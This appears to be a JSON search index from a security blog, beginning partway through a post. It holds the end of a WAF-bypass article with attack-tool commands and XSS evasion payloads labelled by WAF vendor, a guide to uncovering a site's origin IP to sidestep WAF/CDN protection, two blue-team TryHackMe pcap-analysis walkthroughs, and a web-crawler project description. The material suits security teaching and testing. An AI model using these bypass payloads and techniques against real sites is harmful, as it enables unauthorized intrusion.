--tamper=between,randomcase        WAFNinja          Features: Payload obfuscation, fragmentation.      Command: python wafninja.py -u \"&lt;http://target.com/page&gt;\" --method get --payloads sql_injection.txt        Nmap with NSE Scripts          Features: HTTP fragmentation, custom user-agent injection.      Command: nmap --script http-waf-detect target.com        Burp Suite with Extensions          Features: Payload encoding, fuzzing.      Example: Use the Bypass WAF extension.        Commix          Features: Command injection payloads.      Command: python commix.py --url=\"&lt;http://target.com/page.php?id=1&gt;\" --waf-bypass        OWASP ZAP          Features: Fuzzing, scripting.      Example: Use custom scripts to test WAF evasion.      XSS Bypass Techniques and PayloadsCommon Techniques  Obfuscation          Example: &lt;img src=x onerror=\"/*&lt;![CDATA[*/alert(1)/*]]&gt;*/\"&gt;        Alternate Event Handlers          Example: &lt;div style=\"width:expression(alert(1))\"&gt;&lt;/div&gt;        Polyglot Payloads          Example: &lt;script&gt;/*&lt;/script&gt;&lt;svg onload=alert(1)&gt;*/        Payload Splitting          Example: &lt;img src='1' onerror='ja'+'vascript:alert(1)'&gt;        Manipulating Headers          Example: Injecting malicious content into HTTP headers.      WAF-Specific Payloads  Akamai: &lt;style&gt;@keyframes a{}b{animation:a;}&lt;/style&gt;&lt;b/onanimationstart=prompt ${document.domain}&amp;#x60;&gt;  Cloudflare: &lt;a\"/onclick=(confirm)()&gt;Click Here!  Imperva: &lt;x/onclick=globalThis&amp;lsqb;'\\u0070r\\u006f'+'mpt']&amp;lt;)&gt;clickme  Incapsula: &lt;iframe/onload='this[\"src\"]=\"javas&amp;Tab;cript:al\"+\"ert\"';&gt;  WordFence: &lt;meter onmouseover=\"alert(1)\"Real-World Examples of WAF Bypasses  Cloudflare WAF Bypass          Attackers used chunked encoding to bypass Cloudflare’s detection mechanisms.      Example: Splitting payloads into multiple chunks to evade signature-based detection.        AWS WAF Bypass          Exploiting misconfigurations in AWS WAF rules to inject malicious payloads.      Example: Using JSON payloads with malformed syntax to bypass detection.        Imperva WAF Bypass          Attackers used polyglot payloads to exploit Imperva’s rule-based detection.      Example: Combining HTML, JavaScript, and SQL in a single payload.      Best Practices for Defenders  Regular Updates: Keep WAF signatures and rules up-to-date.  Defense-in-Depth: Use multiple layers of security (e.g., input validation, CSP).  Security Testing: Perform regular penetration testing and security assessments.  Behavioral Analysis: Implement machine learning-based behavioral analysis to detect anomalies.  Logging and Monitoring: Continuously monitor WAF logs for suspicious activity.ConclusionWhile WAFs are powerful tools for defending web applications, they are not invulnerable. Attackers constantly develop new methods to bypass these defenses, and the techniques and tools discussed above are instrumental in identifying vulnerabilities that may be missed by a WAF. For security professionals, it’s essential to stay informed about the latest bypass techniques and ensure WAF configurations are up to date."
  },
  
  {
    "title": "Discover the Origin IP Address of a Website and Identify WAF Protection",
    "url": "/posts/find-origin-ip-website",
    "categories": "Guides, Discover Origin IP Address of a Website and Identify WAF",
    "tags": "Guides, Origin IP, Identify WAF",
    "date": "2025-01-15 00:00:00 +0000",
    





    
    "snippet": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an ...",
    "content": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an additional layer of protection that can complicate security assessments and bug bounty testing. However, uncovering the source IP address allows you to bypass these layers and directly assess the server, potentially revealing vulnerabilities hidden by the WAF or CDN.This guide will explore methods for identifying whether a website is behind a WAF/CDN and techniques for discovering its origin IP address.Step 1: Identifying if a Website is Behind a WAF/CDNBefore attempting to find the origin IP, it’s crucial to confirm whether the website is protected by a WAF or CDN. Here are some methods to achieve this:1.1 Ping TestPerform a simple ping test to gather initial information about the IP address associated with the domain:ping target.comIf the IP resolves to a known CDN/WAF provider (e.g., Cloudflare, Amazon CloudFront, Akamai), it indicates the presence of such protection.1.2 Browser ExtensionsUse browser extensions like Wappalyzer to detect CDNs and WAFs. Simply visit the target website and check for any indicators of protection mechanisms.1.3 WafWOOF ToolWafWOOF is a specialized tool designed to identify WAFs. Run the following command:wafw00f https://target.comThis will reveal whether a WAF is in place and specify which one.1.4 WHOIS LookupA WHOIS lookup can provide insights into the hosting provider. If the registrar or hosting details point to a CDN/WAF vendor, it confirms their usage.Step 2: Methods for Discovering the Origin IP AddressOnce you’ve determined that a WAF/CDN is present, proceed with the following techniques to uncover the origin IP address:2.1 DNSReconDNSRecon performs reverse DNS lookups and may expose the origin IP if the server lacks robust WAF protection:dnsrecon -d target.com2.2 Shodan DorksLeverage Shodan’s search capabilities to locate leaked IPs:ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200For automated results, combine Shodan CLI with HTTPX:shodan search ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200 --fields ip_str | httpx-toolkit -sc -title -server -td2.3 CensysCensys is another powerful tool for IP discovery. Search for the target domain and review IPv4 entries matching SSL certificates or host details:https://search.censys.io/hosts?q=&lt;DOMAIN&gt;2.4 SecurityTrailsSecurityTrails offers historical DNS records, which can be invaluable for identifying past IP associations:https://securitytrails.com/domain/&lt;DOMAIN&gt;/history/a2.5 FOFAFOFA excels at finding specific server configurations. Use the favicon hash for refined results:https://fofa.info/Steps:  Extract the favicon URL from the website.  Generate its hash using tools like favicon-hash.  Search for the hash in FOFA.2.6 ZoomEyeSimilar to Shodan, ZoomEye indexes internet devices. Perform a domain search and filter results by favicon hash:https://www.zoomeye.org/searchResult?q=&lt;DOMAIN&gt;2.7 ViewDNS.infoViewDNS provides historical DNS records, including previous IP addresses:https://viewdns.info/iphistory/?domain=&lt;DOMAIN&gt;2.8 SPF RecordsSPF records list authorized sending IPs for email. While not always indicative of the web server, they can sometimes reveal relevant IPs:https://mxtoolbox.com/SuperTool.aspx?action=spf:&lt;DOMAIN&gt;2.9 VirusTotalVirusTotal aggregates data from multiple sources, making it useful for discovering subdomains and associated IPs:https://www.virustotal.com/gui/domain/&lt;DOMAIN&gt;/details2.10 AlienVault OTXAlienVault Open Threat Exchange (OTX) offers threat intelligence data, including IP mappings:https://otx.alienvault.com/indicator/hostname/&lt;DOMAIN&gt;2.11 Custom Bash ScriptCombine VirusTotal and AlienVault outputs into a single script for streamlined results:#!/bin/bash# API keys (replace with your own keys)VT_API_KEY=\"&lt;api_key&gt;\"OTX_API_KEY=\"&lt;api_key&gt;\"# Function to fetch IP addresses from VirusTotalfetch_vt_ips() {    local domain=$1    curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?domain=$domain&amp;apikey=$VT_API_KEY\" \\        | jq -r '.. | .ip_address? // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Function to fetch IP addresses from AlienVaultfetch_otx_ips() {    local domain=$1    curl -s -H \"X-OTX-API-KEY: $OTX_API_KEY\" \"https://otx.alienvault.com/api/v1/indicators/hostname/$domain/url_list?limit=500&amp;page=1\" \\        | jq -r '.url_list[]?.result?.urlworker?.ip // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Check if domain is providedif [ -z \"$1\" ]; then    echo \"Usage: $0 &lt;domain_name_or_url&gt;\"    exit 1fiDOMAIN=$1OUTPUT_FILE=\"${DOMAIN}_ips.txt\"# Get IPs from both sources, remove duplicates, and save to fileecho \"Collecting IP addresses for: $DOMAIN\"{    fetch_vt_ips $DOMAIN    fetch_otx_ips $DOMAIN} | sort -u &gt; \"$OUTPUT_FILE\"echo \"IP addresses saved to: $OUTPUT_FILE\"Step 3: Verifying the Origin IPAfter identifying potential IPs, verify them through the following steps:3.1 /etc/hosts FileModify your /etc/hosts file to map the domain to the suspected IP:&lt;ORIGIN_IP&gt; target.comReload the browser and observe if the site loads correctly without WAF intervention.3.2 Nmap Certificate CheckUse Nmap to inspect the SSL certificate of the IP:nmap --script ssl-cert -p 443 &lt;ORIGIN_IP&gt;Ensure the certificate matches the target domain.3.3 Burp Suite TestingConfigure Burp Suite to route traffic through the discovered IP:  Set the upstream proxy to the origin IP.  Intercept requests and confirm responses originate from the backend server.Tips for Bug Bounty Hunters  Avoid Premature Reporting: Once you discover the origin IP, thoroughly explore it for vulnerabilities like SQL injection, XSS, or misconfigurations before submitting findings.  Test Without WAF: With direct access to the backend server, exploit testing becomes significantly easier due to the absence of WAF filtering.  Document Your Process: Maintain detailed records of your methodology and discoveries for transparency during reporting."
  },
  
  {
    "title": "THM: Carnage",
    "url": "/posts/ctf-blueteam-carnage",
    "categories": "CTF, Blue Team",
    "tags": "CTF, Blue Team",
    "date": "2025-01-13 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  WiresharkResources Used::  Carnage: TryHackMe  VirusTotal  Wireshark DocumentationSteps for the CTF1. What was the date and time for the ...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  WiresharkResources Used::  Carnage: TryHackMe  VirusTotal  Wireshark DocumentationSteps for the CTF1. What was the date and time for the first HTTP connection to the malicious IP?  Navigate to View &gt; Time Display Format &gt; UTC Date and Time of Day to set a human-readable timestamp format.  Filter HTTP traffic using http.  Use Statistics &gt; HTTP &gt; Requests to identify the malicious IP and locate the timestamp of the first HTTP connection.2. What is the name of the zip file that was downloaded?  Apply the filter: http.host == \"attirenepal.com\".  Analyze the HTTP requests and responses to locate the name of the downloaded zip file.3. What was the domain hosting the malicious zip file?  Apply the same filter: http.host == \"attirenepal.com\".  The domain name will be visible in the filtered packets.4. Without downloading the file, what is the name of the file in the zip file?  Follow the TCP stream for relevant traffic (e.g., tcp.stream eq 73).  Look for references to the file name within the stream.5. What is the name of the webserver of the malicious IP from which the zip file was downloaded?  Search for the .xls file in the packet strings.  Use tcp.stream eq 73 to locate the webserver name in the HTTP headers.6. What is the version of the webserver from the previous question?  In the same TCP stream (tcp.stream eq 73), look for the x-powered-by header to identify the webserver version.7. Malicious files were downloaded to the victim host from multiple domains. What were the three domains involved with this activity?  Enable View &gt; Name Resolution &gt; Resolve Network Addresses to translate IPs into domain names.  Analyze the traffic to identify the domains involved in downloading malicious files.8. Which certificate authority issued the SSL certificate to the first domain from the previous question?  Filter the traffic for the specific domain (e.g., tcp.stream eq 90).  Look for the certificate details in the SSL/TLS handshake packets.9. What are the two IP addresses of the Cobalt Strike servers?  Go to Statistics &gt; Conversations &gt; TCP Tab.  Look for patterns such as repeated packets of the same size.  Verify suspected IPs using VirusTotal to confirm if they are Cobalt Strike servers.10. What is the Host header for the first Cobalt Strike IP address from the previous question?  Apply the filter: ip.addr == &lt;Cobalt Strike IP&gt;.  Follow the TCP stream to locate the Host header.11. What is the domain name for the first IP address of the Cobalt Strike server?  With Name Resolution enabled, check the Source column for the domain name associated with the IP.  Verify the domain using VirusTotal.12. What is the domain name of the second Cobalt Strike server IP?  Apply the filter: ip.addr == &lt;Second Cobalt Strike IP&gt;.  Follow the TCP stream to locate the domain name.  Verify the domain using VirusTotal.13. What is the domain name of the post-infection traffic?  Analyze the post-infection traffic for domain names.  Look for suspicious domains in the HTTP or DNS traffic.14. What are the first eleven characters that the victim host sends out to the malicious domain involved in the post-infection traffic?  Analyze the TCP/HTTP stream for POST requests.  Identify the first eleven characters of the data being sent.15. What was the length for the first packet sent out to the C2 server?  Locate the first packet sent to the C2 server.  Check the packet details for its length.16. What was the Server header for the malicious domain from the previous question?  Analyze the HTTP stream for the Server header.  Extract the value from the response headers.17. The malware used an API to check for the IP address of the victim’s machine. What was the date and time when the DNS query for the IP check domain occurred?  Apply the filter: dns &amp;&amp; frame contains \"api\".  Locate the DNS query packet and extract the timestamp.18. What was the domain in the DNS query from the previous question?  Use the same filter: dns &amp;&amp; frame contains \"api\".  Extract the domain name from the DNS query.19. Looks like there was some malicious spam (malspam) activity going on. What was the first MAIL FROM address observed in the traffic?  Remove all filters and search for MAIL FROM.  Locate the email address in the SMTP traffic.20. How many packets were observed for the SMTP traffic?  Go to Statistics &gt; Protocol Hierarchy.  Locate the SMTP protocol and note the number of packets."
  },
  
  {
    "title": "Web Crawler",
    "url": "/posts/python-web-crawler",
    "categories": "Python, Web Crawler",
    "tags": "Python, Web Crawler",
    "date": "2025-01-12 00:00:00 +0000",
    





    
    "snippet": "A GUI-based Python tool for crawling websites, managing proxies, respecting robots.txt rules, and exporting data in HTML, JSON, or CSV formats.Web Crawler Repository  Link: Web Crawler RepositoryFe...",
    "content": "A GUI-based Python tool for crawling websites, managing proxies, respecting robots.txt rules, and exporting data in HTML, JSON, or CSV formats.Web Crawler Repository  Link: Web Crawler RepositoryFeatures  GUI Interface: A user-friendly graphical interface for configuring and controlling the crawler.  Robots.txt Compliance: Automatically checks and respects website crawling rules defined in robots.txt.  Proxy Management: Supports proxy rotation to avoid IP blocking during large-scale crawls.  URL Filtering: Includes and excludes URLs based on customizable patterns and domain restrictions.  Real-Time Statistics: Displays live metrics such as pages crawled, memory usage, queue size, and errors.  Data Visualization: Provides dynamic graphs for crawl speed, memory usage, and URLs in the queue.  Export Options: Export crawled data in HTML, JSON, or CSV formats for further analysis.  Pause/Resume/Stop: Full control over the crawling process with pause, resume, and stop functionality.  Concurrency: Configurable number of concurrent workers for efficient crawling.How It WorksThe Enhanced Web Crawler is a Python-based desktop application designed to extract structured data from websites while adhering to ethical crawling practices. Here’s how it works:  Input Configuration:          Enter the starting URL, maximum depth, and other settings like the number of concurrent workers and rate limits.      Add include/exclude URL patterns to filter which pages should be crawled.        Crawling Process:          The tool checks robots.txt compliance before crawling any page.      It uses proxies (if configured) to rotate IPs and avoid being blocked.      URLs are processed concurrently using a thread pool, ensuring efficient crawling.        Data Extraction:          Extracts metadata such as page titles, links, and timestamps.      Stores the crawled data in memory for real-time updates and visualization.        Monitoring and Export:          Real-time statistics and visualizations help monitor the crawling process.      Once crawling is complete, export the results in HTML, JSON, or CSV formats for further analysis.      Code StructureThe project is organized into modular components for clarity and maintainability:  crawler/: Core functionality for crawling, proxy management, robots.txt parsing, and statistics tracking.          proxy_manager.py: Manages proxy rotation.      robots.py: Handles robots.txt compliance.      stats.py: Tracks crawling statistics.      url_filter.py: Filters URLs based on patterns and domains.        gui/: Implements the graphical user interface.          dashboard.py: Displays real-time statistics and logs.      visualization.py: Provides dynamic graphs for monitoring the crawl process.        webcrawler.py: Entry point of the application, initializes the GUI and starts the crawler.InterfaceThe interface includes:  Crawler Tab: Configure settings, start/pause/stop crawling, and view status.  Dashboard Tab: Monitor real-time statistics and logs.  Visualization Tab: View dynamic graphs for crawl speed, memory usage, and URLs in the queue.Future Enhancements  Advanced Export Options: Support additional export formats like XML or Excel.  Improved Proxy Handling: Add support for authenticated proxies and automatic proxy fetching.  Database Integration: Store crawled data directly in a database for large-scale projects.  Enhanced Visualizations: Add more detailed graphs and analytics for crawled data.  Error Recovery: Implement automatic retry mechanisms for failed requests.Ethical ConsiderationsThe Enhanced Web Crawler is designed with ethical considerations in mind:  Respect for Robots.txt: The tool automatically checks and adheres to robots.txt rules to ensure compliance with website policies.  Rate Limiting: Users can configure rate limits to avoid overloading servers with too many requests.  Proxy Rotation: Helps distribute requests across multiple IPs, reducing the risk of overwhelming a single server.  Transparency: Clear documentation ensures users understand how to use the tool responsibly.Always ensure that you have permission to crawl a website and that your actions comply with applicable laws and terms of service."
  },
  
  {
    "title": "THM: Masterminds",
    "url": "/posts/ctf-blueteam-masterminds",
    "categories": "CTF, Blue Team",
    "tags": "CTF, Blue Team",
    "date": "2025-01-02 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Brim  Zeek (formerly Bro)  Suricata  VirusTotal  URLhaus DatabaseResources Used:  Masterminds: TryHackMeSteps for the CTFTask 2: [Infecti...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: MediumTools Used:  Brim  Zeek (formerly Bro)  Suricata  VirusTotal  URLhaus DatabaseResources Used:  Masterminds: TryHackMeSteps for the CTFTask 2: [Infection1.pcap]Provide the victim’s IP address.We will use the built-in queries to identify the victim IP. The correct IP can be identified as the only internal IP communicating with external IPs.Another way to identify the IP address is by analyzing the total bytes transferred between endpoints:_path==\"conn\" | put total_bytes := orig_bytes + resp_bytes | sort -r total_bytes | cut uid, id, orig_bytes, resp_bytes, total_bytesBased on the results, the victim’s IP address can be identified due to its suspicious total number of bytes and the fact that it belongs to a private IP range.The victim attempted to make HTTP connections to two suspicious domains with the status ‘404 Not Found’. Provide the hosts/domains requested._path==\"http\" | status_code==404 | cut hostThe victim made a successful HTTP connection to one of the domains and received the response_body_len of 1,309 (uncompressed content size of the data transferred from the server). Provide the domain and the destination IP address.Filter for HTTP connections with a status code of 200 and a response body length of 1,309:_path==\"http\" | cut id.resp_h, host, status_code, response_body_len | 200 | 1309How many unique DNS requests were made to cab[.]myfkn[.]com domain (including the capitalized domain)?Use filters to count unique DNS queries to the specified domain.Provide the URI of the domain bhaktivrind[.]com that the victim reached out over HTTP.Filter for HTTP requests to the specific domain and extract the URI:_path==\"http\" | cut host, uri | bhaktivrind.comProvide the IP address of the malicious server and the executable that the victim downloaded from the server.Filter for HTTP requests and analyze the source and destination IPs along with the downloaded file name:_path==\"http\" | cut id.orig_h, id.resp_h, id.resp_p, method, host, uri | uniq -cBased on the information gathered from the second question, provide the name of the malware using VirusTotal.Upload or search for the binary hash obtained earlier in VirusTotal to identify the malware.Task 3: [Infection2.pcap]Provide the IP address of the victim machine.We are going to use the same logic. Another thing to remember is that the IP address is within the same subnet._path==\"conn\" | put total_bytes := orig_bytes + resp_bytes | sort -r total_bytes | cut uid, id, orig_bytes, resp_bytes, total_bytesProvide the IP address the victim made the POST connections to.Filter for POST requests originating from the victim’s IP and extract the destination IP:method==\"POST\" | 192.168.75.146 | cut id.resp_h | sort -r | uniqHow many POST connections were made to the IP address in the previous question?Count the number of POST requests made to the identified IP:method==\"POST\" | 192.168.75.146 | cut id.resp_h | sort -r | uniq -cProvide the domain where the binary was downloaded from.Filter for HTTP requests and extract the domain and URI where the binary was downloaded:With this filter, we can also answer the two next questions._path==\"http\" | cut id.resp_h, host, uri, mime_type | uniqProvide the name of the binary including the full URI.Extract the URI of the binary from the filtered HTTP requests.Provide the IP address of the domain that hosts the binary.Identify the IP address associated with the domain hosting the binary.There were 2 Suricata “A Network Trojan was detected” alerts. What were the source and destination IP addresses?Analyze Suricata alerts to identify the source and destination IPs involved.Taking a look at .top domain in HTTP requests, provide the name of the stealer (Trojan that gathers information from a system) involved in this packet capture using URLhaus Database.Search for the domain in URLhaus to identify the stealer’s name.Task 4: [Infection3.pcap]Provide the IP address of the victim machine.Same concept from the previous tasks, or I should say when analyzing network traffic._path==\"conn\" | put total_bytes := orig_bytes + resp_bytes | sort -r total_bytes | cut uid, id, orig_bytes, resp_bytes, total_bytesProvide three C2 domains from which the binaries were downloaded (starting from the earliest to the latest in the timestamp).Filter for HTTP requests and sort them by timestamp to identify the C2 domains:_path==\"http\" | cut ts, id.orig_h, id.resp_h, id.resp_p, method, host, uri | uniq -c | sort tsProvide the IP addresses for all three domains in the previous question.We get the answer from the previous question, as shown in the filter result.How many unique DNS queries were made to the domain associated from the first IP address from the previous answer?Count the number of unique DNS queries made to the domain linked to the first IP:_path==\"dns\" | count() by query | sort -r | efhoahegue.ruHow many binaries were downloaded from the above domain in total?Filter for HTTP requests to the domain and count the number of binaries downloaded:_path==\"http\" | efhoahegue.ru | cut uri, mime_type | uniq -cProvide the user-agent listed to download the binaries.Extract the user-agent used in the HTTP requests to the identified domain:_path==\"http\" | efhoahegue.ru | cut uri, user_agent | uniq -cProvide the amount of DNS connections made in total for this packet capture.Count the total number of DNS connections in the packet capture:_path==\"dns\" | count() by query | sort -r count | sum(count)With some OSINT skills, provide the name of the worm using the first domain you have managed to collect from Question 2. (Please use quotation marks for Google searches, don’t use .ru in your search, and DO NOT interact with the domain directly).Perform an OSINT investigation using the domain name to identify the worm’s name."
  }
  
]

